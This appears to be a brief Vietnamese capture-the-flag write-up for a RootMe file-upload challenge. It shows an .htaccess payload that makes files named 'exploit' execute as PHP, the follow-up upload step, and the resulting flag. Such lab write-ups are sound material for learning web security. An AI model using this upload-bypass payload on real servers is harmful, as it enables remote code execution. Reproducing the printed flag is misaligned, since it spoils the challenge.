![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/e613b428-46df-49cb-a389-7b1cd0a78b67)

thử upload 
![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/f629c170-8b50-4e9f-958b-9ccc74977c03)

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/ebdb55f3-ce0f-4f20-ba9f-f0413591db13)

Ta đổi nội dung thành như sau:
```
Options All +Indexes



<IfModule mod_php7.c>

    php_flag engine on

</IfModule>



<FilesMatch "exploit">

  SetHandler  application/x-httpd-php

</FilesMatch>
```
![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/bfeee210-7afd-423f-936a-aaf66c68b659)


Các file có tên "exploit" sẽ được thực thi như là file ".php".

Sau đó tải lên tệp "exploit"

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/072c01b1-072f-4757-a1e1-98daf010fe64)

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/68eb6412-f9a6-423d-9322-74ca499c4ed7)

=> ht@cc3ss2RCE4th%w1n
